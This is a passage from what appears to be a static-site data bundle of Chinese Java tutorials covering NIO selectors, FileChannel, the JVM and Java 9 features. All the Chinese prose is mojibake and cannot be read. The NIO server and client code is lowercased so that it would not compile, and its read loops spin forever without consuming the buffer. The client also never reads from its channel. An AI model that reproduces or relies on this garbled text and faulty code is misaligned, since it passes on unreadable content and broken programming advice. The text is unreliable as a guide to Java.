channelï¼ééï¼çç¶ææ¯å¦å¤äºå¯è¯»ãå¯åãå¦æ­¤å¯ä»¥å®ç°åçº¿ç¨ç®¡çå¤ä¸ª channels, ä¹å°±æ¯å¯ä»¥ç®¡çå¤ä¸ªç½ç»é¾æ¥ã\nä½¿ç¨ selector çå¥½å¤å¨äºï¼ ä½¿ç¨æ´å°ççº¿ç¨æ¥å°±å¯ä»¥æ¥å¤çééäºï¼ ç¸æ¯ä½¿ç¨å¤ä¸ªçº¿ç¨ï¼é¿åäºçº¿ç¨ä¸ä¸æåæ¢å¸¦æ¥çå¼éã\n\n\n# æå¡ç«¯ä»£ç \n\n    public static void main(string[] args) throws exception {\n        serversocketchannel server = serversocketchannel.open();\n        server.configureblocking(false);\n        server.bind(new inetsocketaddress(8888));\n        // è·åå¤è·¯å¤ç¨éæ©å¨\n        selector selector = selector.open();\n        // æå¡ç«¯æ³¨å æ¥æ¶å®¢æ·ç«¯ç çå¬äºä»¶\n        server.register(selector, selectionkey.op_accept);\n        while(true){\n            // è¯¥æ¹æ³ä¼é»å¡ï¼ç´å°æäºä»¶å°è¾¾uï¼æä¼æ¾å¿\n            selector.select();\n            // è·åææäºä»¶çkeyï¼èµ°å°è¿ä»£è¡¨æäºä»¶æ¥äº\n            set<selectionkey> selectionkeys = selector.selectedkeys();\n            // åå¤è¿­ä»£ææäºä»¶\n            iterator<selectionkey> selectionkeyiterable = selectionkeys.iterator();\n            while (selectionkeyiterable.hasnext()){\n                // è·åäºä»¶\n                selectionkey selectionkey = selectionkeyiterable.next();\n                // è¡¨ç¤ºæå®¢æ·è¿æ¥\n                if(selectionkey.isacceptable()){\n                    // å¾å°è¿æ¥\n                    serversocketchannel serversocketchannel = (serversocketchannel) selectionkey.channel();\n                    // å»ºç«åå¯¹åºå®¢æ·éä¿¡çéé\n                    socketchannel socketchannel = serversocketchannel.accept();\n                    // è°ç¥ä¸ºéé»å¡éä¿¡\n                    socketchannel.configureblocking(false);\n                    // æ³¨åæ¥æè¯»åäºä»¶\n                    socketchannel.register(selector, selectionkey.op_read|selectionkey.op_write);\n                }\n                // è¡¨ç¤ºææ°æ®åéå°æå¡ç«¯,è¿éå¯ä»¥ä¸ç¨ç»§ç»­è®¾ç½® configureblocking ä¸ºéé»å¡ï¼å¨è¿æ¥çæ¶åééå·²ç»æ è®°è¿äº\n                if(selectionkey.isreadable()){\n                    // å¾å°è¿æ¥\n                    socketchannel socketchannel = (socketchannel) selectionkey.channel();\n                    bytebuffer bytebuffer = bytebuffer.allocatedirect(20);\n                    socketchannel.read(bytebuffer);\n                    while (bytebuffer.hasremaining()){\n                        system.out.println("æ¶å°å®¢æ·ç«¯çéä¿¡: "+new string(bytebuffer.array()));\n                    }\n                    \n                }\n                // ç»å®¢æ·ç«¯åéæ°æ®\n                if(selectionkey.iswritable()){\n                    socketchannel socketchannel = (socketchannel) selectionkey.channel();\n                    bytebuffer bytebuffer = bytebuffer.wrap("3333333".getbytes());\n                    // è¯»åæ¶éé»å¡çï¼ä¸ºäºç¡®ä¿è¯»åå®æ´æ§ï¼éè¦å ä¸ hasremaining\n                    while (bytebuffer.hasremaining()){\n                        socketchannel.write(bytebuffer);\n                    }\n                }\n                // å¤çå®æ¯ç§»é¤äºä»¶ï¼é¿åéå¤\n                selectionkeyiterable.remove();\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n\n# å®¢æ·ç«¯ä»£ç \n\n    public static void main(string[] args) throws exception {\n        socketchannel socketchannel = socketchannel.open();\n        socketchannel.configureblocking(false);\n        socketchannel.connect(new inetsocketaddress("127.0.0.1",8888));\n        selector selector = selector.open();\n        socketchannel.register(selector,selectionkey.op_connect);\n        while(true){\n            selector.select();\n            iterator<selectionkey> selectionkeyiterator = selector.selectedkeys().iterator();\n            while (selectionkeyiterator.hasnext()){\n                selectionkey selectionkey = selectionkeyiterator.next();\n                if(selectionkey.isconnectable()){\n                    socketchannel sc = (socketchannel) selectionkey.channel();\n                    sc.register(selector,selectionkey.op_read|selectionkey.op_write);\n                }\n                if(selectionkey.isreadable()){\n                    socketchannel sc = (socketchannel) selectionkey.channel();\n                    bytebuffer bytebuffer = bytebuffer.allocate(10);\n                    while (bytebuffer.hasremaining()){\n                        system.out.println("æ¶å°æå¡ç«¯æ¶æ¯ï¼"+new string(bytebuffer.array()));\n                    } \n                }\n                if(selectionkey.iswritable()){\n                    socketchannel sc = (socketchannel) selectionkey.channel();\n                    bytebuffer bytebuffer = bytebuffer.wrap("3333333".getbytes());\n                    // è¯»åæ¶éé»å¡çï¼ä¸ºäºç¡®ä¿è¯»åå®æ´æ§ï¼éè¦å ä¸ hasremaining\n                    while (bytebuffer.hasremaining()){\n                        sc.write(bytebuffer);\n                    }\n                }\n                selectionkeyiterator.remove();\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# filechannel\n\n    public static void main(string[] args) throws exception {\n        filechannel write = new fileoutputstream(new file("1.txt")).getchannel();\n        bytebuffer writebytebuffer = bytebuffer.wrap("2321312".getbytes());\n        if(writebytebuffer.hasremaining()) {\n            write.write(writebytebuffer);\n        }\n        write.close();\n\n        filechannel read = new fileinputstream(new file("1.txt")).getchannel();\n        bytebuffer readbytebuffer = bytebuffer.wrap("2321312".getbytes());\n        read.read(readbytebuffer);\n        if(readbytebuffer.hasremaining()) {\n            system.out.println("æä»¶åå®¹ï¼"+new string(readbytebuffer.array()));\n        }\n        read.close();\n\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n',charsets:{cjk:!0}},{title:"JVM æ¨¡åä»ç»",frontmatter:{title:"JVM æ¨¡åä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/jvm/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/02.JVM/1.JVM%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D.html",relativePath:"00.è¯­è¨/01.JAVA/02.JVM/1.JVMæ¨¡åä»ç».md",key:"v-26d5b34d",path:"/language/java/jvm/1/",headers:[{level:2,title:"JVM æ»ä½å¾",slug:"jvm-æ»ä½å¾",normalizedTitle:"jvm æ»ä½å¾",charIndex:2}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"JVM æ»ä½å¾",content:"# JVM æ»ä½å¾\n\nå­¦ä¹  JVM å¼å¯¼ï¼\n\n * é¦åäºè§£ JVM æ¨¡åçç»æï¼ç± 4 ä¸ªç»æé¨å ç±»å è½½å¨ ã è¿è¡æ¶æ°æ®åº ã æ§è¡å¼æ ã æ¬å°æ¹æ³æ¥å£\n * äºè§£ JVM æ´ä¸ªè¿è¡æºå¶ï¼äºè§£ç±»å è½½æºå¶\n * äºè§£è¿è¡æ¶æ°æ®åºçéè¦ç»æé¨åï¼ PCç¨åºè®¡æ°å¨ ã èææºæ  ã å åº ã åæ°æ®åº ã æ¬å°æ¹æ³æ ",normalizedContent:"# jvm æ»ä½å¾\n\nå­¦ä¹  jvm å¼å¯¼ï¼\n\n * é¦åäºè§£ jvm æ¨¡åçç»æï¼ç± 4 ä¸ªç»æé¨å ç±»å è½½å¨ ã è¿è¡æ¶æ°æ®åº ã æ§è¡å¼æ ã æ¬å°æ¹æ³æ¥å£\n * äºè§£ jvm æ´ä¸ªè¿è¡æºå¶ï¼äºè§£ç±»å è½½æºå¶\n * äºè§£è¿è¡æ¶æ°æ®åºçéè¦ç»æé¨åï¼ pcç¨åºè®¡æ°å¨ ã èææºæ  ã å åº ã åæ°æ®åº ã æ¬å°æ¹æ³æ ",charsets:{cjk:!0}},{title:"JAVA9 æ°ç¹æ§æ»ç»",frontmatter:{title:"JAVA9 æ°ç¹æ§æ»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/version/2/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/03.%E7%89%88%E6%9C%AC/2.JAVA9%20%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93.html",relativePath:"00.è¯­è¨/01.JAVA/03.çæ¬/2.JAVA9 æ°ç¹æ§æ»ç».md",key:"v-1177a00b",path:"/language/java/version/2/",headers:[{level:2,title:"æ¨¡åæºå¶",slug:"æ¨¡åæºå¶",normalizedTitle:"æ¨¡åæºå¶",charIndex:2},{level:2,title:"JShelläº¤äºå¼ç¼ç¨",slug:"jshelläº¤äºå¼ç¼ç¨",normalizedTitle:"jshell äº¤äºå¼ç¼ç¨",charIndex:1743},{level:2,title:"æ¥å£ä¸­çprivateæ¹æ³",slug:"æ¥å£ä¸­çprivateæ¹æ³",normalizedTitle:"æ¥å£ä¸­ç private æ¹æ³",charIndex:2433},{level:2,title:"éåç±»æ°å¢å·¥åæ¹æ³",slug:"éåç±»æ°å¢å·¥åæ¹æ³",normalizedTitle:"éåç±»æ°å¢å·¥åæ¹æ³",charIndex:3090},{level:2,title:"æ¹è¿çStream API",slug:"æ¹è¿çstream-api",normalizedTitle:"æ¹è¿ç stream api",charIndex:3496},{level:2,title:"å¶ä»å°æ¹å¨",slug:"å¶ä»å°æ¹å¨",normalizedTitle:"å¶ä»å°æ¹å¨",charIndex:4355}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ¨¡åæºå¶ JShelläº¤äºå¼ç¼ç¨ æ¥å£ä¸­çprivateæ¹æ³ éåç±»æ°å¢å·¥åæ¹æ³ æ¹è¿çStream API å¶ä»å°æ¹å¨",content:'# æ¨¡åæºå¶\n\nå½æä»¬å¯¼å¥ä¸ä¸ª jar ååä¸ºä¾èµæ¶ï¼åæ¬ JDK å®æ¹åºï¼ï¼å®éä¸å¾å¤åè½æä»¬å¹¶ä¸ä¼ç¨å°ï¼ä½æ¯ç±äºä»ä»¬æ¯å±äºåä¸ä¸ª jar æç»å¨ä¸èµ·ï¼è¿æ ·å°±ä¼å¯¼è´æä»¬å¯è½åªç¨å°ä¸é¨ååè½ï¼ä½æ¯éè¦å¼ç¨ä¸ä¸ªå®æ´çç±»åºï¼å®éä¸æä»¬å¯ä»¥æç¨ä¸å°çç±»åºæé¤æï¼å¤§å¤§éä½ jar åºçè§æ¨¡ã\n\nJAVA9 å¼å¥äºæ¨¡åæºå¶æ¥å¯¹è¿ç§æåµè¿è¡ä¼åï¼å¨ä¹åæä»¬çé¡¹ç®å¦ä¸ï¼\n\n\n\nå¼å¥æ¨¡åæºå¶ä¹åï¼å¦ä¸ï¼\n\n\n\nå¯ä»¥çå°ï¼æ¨¡åå¯ä»¥ç±ä¸ä¸ªæèå¤ä¸ªå¨ä¸èµ·ç Java åç»æï¼éè¿æ±è¿äºåååºä¸åçæ¨¡åï¼æä»¬å°±å¯ä»¥æç§æ¨¡åçæ¹å¼è¿è¡ç®¡çäºãè¿éæä»¬åå»ºä¸ä¸ªæ°çé¡¹ç®ï¼å¹¶å¨ src ç®å½ä¸ï¼æ­å»º module-info.java æä»¶è¡¨ç¤ºæ­¤é¡¹ç®éç¨æ¨¡åæºå¶ï¼æä»¬å¯ä»¥å¨ idea å³é®åå»º module-info.java æä»¶\n\n\n\n\n\nå¨ JAVA 9 å¦æä¸åå»º module-info.javaï¼åææåé½ä¼è¢«å è½½ï¼è¥å¸æåçæ¸æ¥ï¼å¯ä»¥åå»º module-info.javaï¼ä¸æ¦åå»º module-info.java ååªä¼å¯¼å¥ JAVA9 çé¨ååºç¡åï¼å¦ Logger ç±»ï¼ä»¥åç¨çæ¯ java.util.logging çï¼ä½åå»º module-info.java ååªæ java.lang.System ä¸çï¼æä»¬å¯ä»¥å¨ module-info.java å¯¼å¥æä»¬æ³ç¨ç\n\n\n\n\n\n\n\nå¦æå äº module-info.java åéè¦æ¸æ¥äºè§£ä½ éè¦ä½¿ç¨çåä½äºåªéï¼å¦æä½¿ç¨åå°çè¯ï¼æ²¡æå¯¼å¥è¿æ ·çåä¼æ¥éï¼å¦ä¸å¯¹ String ååå°æ¥éç»æ\n\n\n\n\n\nJAVA9 çåå° API å°è£åå®å¨æ§å¾å°äºæ¹è¿ï¼å¦ææ¨¡åæ²¡ææç¡®ææç»å¶ä»æ¨¡åä½¿ç¨åå°çæéï¼é£ä¹å¶ä»æ¨¡åæ¯ä¸åè®¸ä½¿ç¨åå°è¿è¡ä¿®æ¹çï¼çæ¥ Unsafe ç±»æ¯å®ä¸æäºãå¯¹äºæ¨¡åçæºå¶å·æä»¥ä¸åä¸­ç±»åï¼\n\n * ç³»ç»æ¨¡åï¼æ¥èª JDK å JRE çæ¨¡åï¼å®æ¹æä¾çæ¨¡åï¼æ¯å¦æä»¬ä¸é¢ç¨çï¼ï¼æä»¬ä¹å¯ä»¥ç´æ¥ä½¿ç¨ java --list-modules å½ä»¤æ¥ååºææçæ¨¡åï¼ä¸åçæ¨¡åä¼å¯¼åºä¸åçåä¾æä»¬ä½¿ç¨ã\n * åºç¨ç¨åºæ¨¡åï¼æä»¬èªå·±åç JAVA æ¨¡åé¡¹ç®\n * èªå¨æ¨¡åï¼å¯è½æäºåºå¹¶ä¸æ¯ Java9 ä»¥ä¸çæ¨¡åé¡¹ç®ï¼è¿ç§æ¶åéè¦åå¼å®¹äºï¼é»è®¤æåµä¸æ¯ç´æ¥å¯¼åºææçåï¼å¯ä»¥è®¿é®ææå¶ä»æ¨¡åæä¾ç±»ï¼ä¸ç¶ä¹åçæ¬çåºå°±ç¨ä¸äºäºã\n * æªå½åçæ¨¡åï¼æä»¬èªå·±åå»ºçä¸ä¸ª Java é¡¹ç®ï¼å¦ææ²¡æåå»º module-info.javaï¼é£ä¹ä¼æç§æªå½åæ¨¡åè¿è¡å¤çï¼æªå½åæ¨¡ååæ ·å¯ä»¥è®¿é®ææå¶ä»æ¨¡åæä¾çç±»ï¼è¿æ ·æä»¬ä¹ååç java8 ä»£ç æè½æ¿ç­å°å¨ java9 ä»¥åä¹åççæ¬ä¸è¿è¡ãä¸è¿ï¼ç±äºæ²¡æä½¿ç¨ java9 çæ¨¡åæ°ç¹æ§ï¼æªå½åæ¨¡ååªè½é»è®¤æ´é²ç»å¶ä»æªå½åçæ¨¡ååèªå¨æ¨¡åï¼åºç¨ç¨åºæ¨¡åæ æ³è®¿é®è¿äºï¼å®éä¸å°±æ¯ä¼ ç» java8 ä»¥ä¸çåææ¨¡å¼ï¼å ä¸ºæ²¡ææ¨¡ååªéè¦å¯¼åå°±è¡ï¼\n\næä»¬ä¹å¯ä»¥èªå·±åä¸äº jar æä¾å«äººä½¿ç¨ï¼å¨ä½¿ç¨çæ¶åä½¿ç¨ module-info.java è®©æ§å¶åªäºå¯¼å¥ï¼åªäºä¸å¯¼å¥\n\n\n\n\n\n\n\n\n\nrequires è¿å¯ä»¥å  static å³é®å­ï¼å äº static ä¹åï¼å¨ç¼è¯çæ¶åä¼ä¾ç¶æè¿ä¸ªåï¼ä½æ¯å¨è¿è¡çæ¶åå°±ä¼æ¥æ¾ä¸å°è¯¥åã\n\n\n\né¤äº exports å¯ä»¥è· to å³é®å­ï¼ä»£è¡¨æ´é²ç»è°ï¼ææåªäºåå¯ä»¥ä½¿ç¨æè¿ä¸ªå\n\n\n\n\n\nå½ a ä½¿ç¨äºæäºååï¼é»è®¤ b æ¯ä¸è½ä½¿ç¨ a æä½¿ç¨çåçï¼ä¹å°±æ¯æ²¡æä¼ éæ§ï¼æä»¬æå¯¼å¥å requires åé¢å  transitive å³é®å­è®©å¶æä¾èµä¼ é\n\n\n\n\n\nå¦ææä»¬å¯¹ ä»¥ä¸ç User ä½¿ç¨åå°ï¼ä¹æ¯ä¸è½ç´æ¥ä½¿ç¨çï¼ä¼æ¥é\n\n\n\n\n\néè¦ä½¿ç¨ open å³é®å­å¯¹æ´ä¸ªæéè¦åå°ç module è¿è¡æè¿°ï¼å¦æä¸æ³å¯¹ module è¿è¡æè¿°ï¼ä¹å¯ä»¥å¯¹ module ä¸çéè¦åå°ç±»æå¨çåè¿è¡ opens æè¿°\n\n\n\n\n\nuses è¯­å¥ä½¿ç¨æå¡æ¥å£çåå­ï¼å½åæ¨¡åå°±ä¼åç°å®ï¼ä½¿ç¨ java.util.ServiceLoader ç±»è¿è¡å è½½ï¼å¿é¡»æ¯æ¬æ¨¡åä¸­çï¼ä¸è½æ¯å¶ä»æ¨¡åä¸­çãå¶å®ç°ç±»å¯ä»¥ç±å¶ä»æ¨¡åæä¾.\n\n\n\n\n\n\n# JShell äº¤äºå¼ç¼ç¨\n\njava9 ä¸ºæä»¬æä¾äºä¸ç§äº¤äºå¼åæå·¥å· Jshellï¼ä½ è¿å«è¯´ï¼çæ Python çå³é\n\nC:\\Users\\User>jshell\n|  æ¬¢è¿ä½¿ç¨ JShell -- çæ¬ 17.0.3.1\n|  è¦å¤§è´äºè§£è¯¥çæ¬, è¯·é®å¥: /help intro\n\njshell>\n\n\n1\n2\n3\n4\n5\n\n\nç¯å¢éç½®å®æåï¼æä»¬åªéè¦è¾å¥ jshell å½ä»¤å³å¯å¼å¯äº¤äºå¼ç¼ç¨äºï¼å®æ¯ææä»¬ä¸æ¡ä¸æ¡å½ä»¤è¿è¡æä½ãæ¯å¦æä»¬æ¥åä¸ä¸ªç®åçè®¡ç®ï¼\n\njshell> int a = 10\na ==> 10\n\njshell> int b = 10\nb ==> 10\n\njshell> int c = a/b\nc ==> 1\n\njshell>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nä½¿ç¨ /vars å¯ä»¥çå°æä»¬å®ä¹çææåé\n\njshell> /vars\n|    int a = 10\n|    int b = 10\n|    int c = 1\n\n\n1\n2\n3\n4\n\n\næä»¬ä¹å¯ä»¥åä¸ä¸ªæ¹æ³ï¼å¹¶éè¿ /method æ¹æ³ååºæææ¹æ³ï¼å¹¶è°ç¨æ¹æ³\n\njshell> public int max(int a,int b){\n   ...>     return a > b? a: b;\n   ...> }\n|  å·²åå»º æ¹æ³ max(int,int)\n\njshell> /method\n|    int max(int,int)\n\njshell> max(19,20)\n$5 ==> 20\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# æ¥å£ä¸­ç private æ¹æ³\n\nå¨ Java8 ä¸­ï¼æ¥å£ä¸­çæ¹æ³æ¯ææ·»å  default å³é®å­æ¥æ·»å é»è®¤å®ç°ï¼èå¨ java9 ä¸­ï¼æ¥å£åæ¬¡å¾å°å¼ºåï¼æä¾æ¥å£ä¸­å¯ä»¥å­å¨ç§ææ¹æ³ã\n\npackage com.b;\n\npublic interface Test {\n\n    default void test(){\n        this.test1();\n        System.out.println("é»è®¤æ¹æ³");\n    }\n\n    private void test1(){\n        System.out.println("ç§ææ¹æ³");\n    }\n\n    static void test2(){\n        System.out.println("éææ¹æ³");\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\npackage com.b;\n\npublic class MainB implements Test {\n\n    public static void main(String[] args){\n        MainB mainB = new MainB();\n        mainB.test();\n        Test.test2();\n    }\n\n}\n\nç§ææ¹æ³\né»è®¤æ¹æ³\néææ¹æ³\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# éåç±»æ°å¢å·¥åæ¹æ³\n\nå¨ä¹åï¼å¦ææä»¬æ³è¦å¿«éåå»ºä¸ä¸ª Map å¯ä»¥éè¿ä»¥ä¸æ¹å¼\n\n    public static void main(String[] args){\n        Map<String,String> map = new HashMap(3);\n        map.put("key","value");\n        \n        map = new HashMap<String,String>(3){{\n            put("key","value");\n        }};    \n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¨ java9 ä¹åï¼æä»¬å¯ä»¥ç´æ¥éè¿ of æ¹æ³æ¥å¿«éåå»ºï¼ä½æ¯è¿ç§æ¹å¼å°±ä¸è½ä½¿ç¨ put æ¹æ³\n\nMap<String, String> key = Map.of("key", "value");\n\n\n1\n\n\n\n# æ¹è¿ç Stream API\n\n    public static void main(String[] args){\n        // java8 åªè½ä½¿ç¨ofï¼ä¸ºnullä¼æ¥é\n        Stream.of(null).forEach(System.out::println);\n\n        // Java9 åè®¸ä¸ºnull\n        Stream.ofNullable(null).forEach(System.out::println);\n\n        // java8 åè®¸çææ éçæ°æ®ï¼å¯ä»¥ç¨limitéå¶\n        Stream.iterate(0,i -> i+1).limit(20).forEach(System.out::println);\n\n        // java9 åä¸ºä½¿ç¨è¡¨è¾¾å¼æ¥éå¶ ç¸å½äº for (int i=0;i<20;i++)\n        Stream.iterate(0,i -> i < 20,i -> i + 1).forEach(System.out::println);\n\n        // java9 è¿å¢å äºæªæ­æµ, i < 10ï¼çæ å°äº 10 çæ°æ®\n        Stream.iterate(0,i -> i < 20,i -> i + 1).takeWhile(i -> i>10).forEach(System.out::println);\n\n        // java9 è¿å¢å äºå é¤æµ, i < 10ï¼å°äº 10 çæ°æ®é½è¢«å æï¼ç¸å½äºå¼æå° i >= 10 çæ°æ®\n        Stream.iterate(0,i -> i < 20,i -> i + 1).dropWhile(i -> i>10).forEach(System.out::println);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¶ä»å°æ¹å¨\n\njava7 æ°å¢äº Try-with-resourcesï¼åªæå®ç°äº AutoCloseable æ Closeable æ¥å£çèµæºï¼ï¼JAVA9 æå¯¹ try å¢å¼º\n\npublic void java8(){\n        try (InputStream stream = Files.newInputStream(Paths.get("pom.xml"))){\n                stream....\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    public void java9() throws IOException {\n        InputStream stream = Files.newInputStream(Paths.get("pom.xml"));\n        try (stream){\n            for (int i = 0; i < 100; i++) {\n                System.out.println(stream.read());\n            }\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nOptional å¢å¼º\n\n    public void java8(){\n        String s = null;\n        Optional.ofNullable(s).ifPresent(str -> System.out.println("str = " + str));\n    }\n\n    public void java9() throws IOException {\n        String s = null;\n        // ç±»ä¼¼äº if else\n        Optional.ofNullable(s)\n                .ifPresentOrElse(str -> System.out.println("str = " + str),() -> System.out.println("MainB.java9"));\n    }\n\n    public void java9_1()  {\n        String s = null;\n        // ç±»ä¼¼äº if else\n        Optional.ofNullable(s)\n                .ifPresentOrElse(str -> System.out.println("str = " + str),() -> System.out.println("MainB.java9"));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n',normalizedContent:'# æ¨¡åæºå¶\n\nå½æä»¬å¯¼å¥ä¸ä¸ª jar ååä¸ºä¾èµæ¶ï¼åæ¬ jdk å®æ¹åºï¼ï¼å®éä¸å¾å¤åè½æä»¬å¹¶ä¸ä¼ç¨å°ï¼ä½æ¯ç±äºä»ä»¬æ¯å±äºåä¸ä¸ª jar æç»å¨ä¸èµ·ï¼è¿æ ·å°±ä¼å¯¼è´æä»¬å¯è½åªç¨å°ä¸é¨ååè½ï¼ä½æ¯éè¦å¼ç¨ä¸ä¸ªå®æ´çç±»åºï¼å®éä¸æä»¬å¯ä»¥æç¨ä¸å°çç±»åºæé¤æï¼å¤§å¤§éä½ jar åºçè§æ¨¡ã\n\njava9 å¼å¥äºæ¨¡åæºå¶æ¥å¯¹è¿ç§æåµè¿è¡ä¼åï¼å¨ä¹åæä»¬çé¡¹ç®å¦ä¸ï¼\n\n\n\nå¼å¥æ¨¡åæºå¶ä¹åï¼å¦ä¸ï¼\n\n\n\nå¯ä»¥çå°ï¼æ¨¡åå¯ä»¥ç±ä¸ä¸ªæèå¤ä¸ªå¨ä¸èµ·ç java åç»æï¼éè¿æ±è¿äºåååºä¸åçæ¨¡åï¼æä»¬å°±å¯ä»¥æç§æ¨¡åçæ¹å¼è¿è¡ç®¡çäºãè¿éæä»¬åå»ºä¸ä¸ªæ°çé¡¹ç®ï¼å¹¶å¨ src ç®å½ä¸ï¼æ­å»º module-info.java æä»¶è¡¨ç¤ºæ­¤é¡¹ç®éç¨æ¨¡åæºå¶ï¼æä»¬å¯ä»¥å¨ idea å³é®åå»º module-info.java æä»¶\n\n\n\n\n\nå¨ java 9 å¦æä¸åå»º module-info.javaï¼åææåé½ä¼è¢«å è½½ï¼è¥å¸æåçæ¸æ¥ï¼å¯ä»¥åå»º module-info.javaï¼ä¸æ¦åå»º module-info.java ååªä¼å¯¼å¥ java9 çé¨ååºç¡åï¼å¦ logger ç±»ï¼ä»¥åç¨çæ¯ java.util.logging çï¼ä½åå»º module-info.java ååªæ java.lang.system ä¸çï¼æä»¬å¯ä»¥å¨ module-info.java å¯¼å¥æä»¬æ³ç¨ç\n\n\n\n\n\n\n\nå¦æå äº module-info.java åéè¦æ¸æ¥äºè§£ä½ éè¦ä½¿ç¨çåä½äºåªéï¼å¦æä½¿ç¨åå°çè¯ï¼æ²¡æå¯¼å¥è¿æ ·çåä¼æ¥éï¼å¦ä¸å¯¹ string ååå°æ¥éç»æ\n\n\n\n\n\njava9 çåå° api å°è£åå®å¨æ§å¾å°äºæ¹è¿ï¼å¦ææ¨¡åæ²¡ææç¡®ææç»å¶ä»æ¨¡åä½¿ç¨åå°çæéï¼é£ä¹å¶ä»æ¨¡åæ¯ä¸åè®¸ä½¿ç¨åå°è¿è¡ä¿®æ¹çï¼çæ¥ unsafe ç±»æ¯å®ä¸æäºãå¯¹äºæ¨¡åçæºå¶å·æä»¥ä¸åä¸­ç±»åï¼\n\n * ç³»ç»æ¨¡åï¼æ¥èª jdk å jre çæ¨¡åï¼å®æ¹æä¾çæ¨¡åï¼æ¯å¦æä»¬ä¸é¢ç¨çï¼ï¼æä»¬ä¹å¯ä»¥ç´æ¥ä½¿ç¨ java --list-modules å½ä»¤æ¥ååºææçæ¨¡åï¼ä¸åçæ¨¡åä¼å¯¼åºä¸åçåä¾æä»¬ä½¿ç¨ã\n * åºç¨ç¨åºæ¨¡åï¼æä»¬èªå·±åç java æ¨¡åé¡¹ç®\n * èªå¨æ¨¡åï¼å¯è½æäºåºå¹¶ä¸æ¯ java9 ä»¥ä¸çæ¨¡åé¡¹ç®ï¼è¿ç§æ¶åéè¦åå¼å®¹äºï¼é»è®¤æåµä¸æ¯ç´æ¥å¯¼åºææçåï¼å¯ä»¥è®¿é®ææå¶ä»æ¨¡åæä¾ç±»ï¼ä¸ç¶ä¹åçæ¬çåºå°±ç¨ä¸äºäºã\n * æªå½åçæ¨¡åï¼æä»¬èªå·±åå»ºçä¸ä¸ª java é¡¹ç®ï¼å¦ææ²¡æåå»º module-info.javaï¼é£ä¹ä¼æç§æªå½åæ¨¡åè¿è¡å¤çï¼æªå½åæ¨¡ååæ ·å¯ä»¥è®¿é®ææå¶ä»æ¨¡åæä¾çç±»ï¼è¿æ ·æä»¬ä¹ååç java8 ä»£ç æè½æ¿ç­å°å¨ java9 ä»¥åä¹åççæ¬ä¸è¿è¡ãä¸è¿ï¼ç±äºæ²¡æä½¿ç¨ java9 çæ¨¡åæ°ç¹æ§ï¼æªå½åæ¨¡ååªè½é»è®¤æ´é²ç»å¶ä»æªå½åçæ¨¡ååèªå¨æ¨¡åï¼åºç¨ç¨åºæ¨¡åæ æ³è®¿é®è¿äºï¼å®éä¸å°±æ¯ä¼ ç» java8 ä»¥ä¸çåææ¨¡å¼ï¼å ä¸ºæ²¡ææ¨¡ååªéè¦å¯¼åå°±è¡ï¼\n\næä»¬ä¹å¯ä»¥èªå·±åä¸äº jar æä¾å«äººä½¿ç¨ï¼å¨ä½¿ç¨çæ¶åä½¿ç¨ module-info.java è®©æ§å¶åªäºå¯¼å¥ï¼åªäºä¸å¯¼å¥\n\n\n\n\n\n\n\n\n\nrequires è¿å¯ä»¥å  static å³é®å­ï¼å äº static ä¹åï¼å¨ç¼è¯çæ¶åä¼ä¾ç¶æè¿ä¸ªåï¼ä½æ¯å¨è¿è¡çæ¶åå°±ä¼æ¥æ¾ä¸å°è¯¥åã\n\n\n\né¤äº exports å¯ä»¥è· to å³é®å­ï¼ä»£è¡¨æ´é²ç»è°ï¼ææåªäºåå¯ä»¥ä½¿ç¨æè¿ä¸ªå\n\n\n\n\n\nå½ a ä½¿ç¨äºæäºååï¼é»è®¤ b æ¯ä¸è½ä½¿ç¨ a æä½¿ç¨çåçï¼ä¹å°±æ¯æ²¡æä¼ éæ§ï¼æä»¬æå¯¼å¥å requires åé¢å  transitive å³é®å­è®©å¶æä¾èµä¼ é\n\n\n\n\n\nå¦ææä»¬å¯¹ ä»¥ä¸ç user ä½¿ç¨åå°ï¼ä¹æ¯ä¸è½ç´æ¥ä½¿ç¨çï¼ä¼æ¥é\n\n\n\n\n\néè¦ä½¿ç¨ open å³é®å­å¯¹æ´ä¸ªæéè¦åå°ç module è¿è¡æè¿°ï¼å¦æä¸æ³å¯¹ module è¿è¡æè¿°ï¼ä¹å¯ä»¥å¯¹ module ä¸çéè¦åå°ç±»æå¨çåè¿è¡ opens æè¿°\n\n\n\n\n\nuses 